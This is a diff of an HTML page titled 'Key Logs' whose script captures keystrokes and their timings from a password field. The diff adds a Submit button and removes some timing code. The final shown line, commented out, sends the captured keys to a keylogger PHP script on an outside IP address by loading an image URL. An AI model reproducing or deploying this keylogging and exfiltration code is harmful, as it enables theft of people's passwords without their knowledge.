@@ -7,7 +7,7 @@
 
 	<h1>Key Logs</h1>
 
-	<input type="password" id = "text">
+	<input type="password" id = "text">&nbsp &nbsp &nbsp &nbsp &nbsp <button type = "Submit" onclick="getArray()">Submit</button>
 	<p id="demo"></p>
 
 <script>
@@ -47,7 +47,6 @@ document.getElementById("text").onkeydown = function(e) {
 
     	}*/
     	buffer.push(stroke);
-    	newstroke = stroke;
     }
 
 	window.setInterval(function(){
@@ -80,16 +79,7 @@ document.getElementById("text").onkeyup = function(e) {
     else if(stroke["key"] != "Shift")
     {
     	buffer.push(stroke);
-    	var up = buffer.pop();
-    	var down = buffer.pop();
-    	var time = up.time-down.time;
-
-    	newstroke.key=stroke.key;
-    	newstroke.time=time;
-    	oldstroke = newstroke;
-    	buffer.push(newstroke);
     }
-
 
 	window.setInterval(function(){
 	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
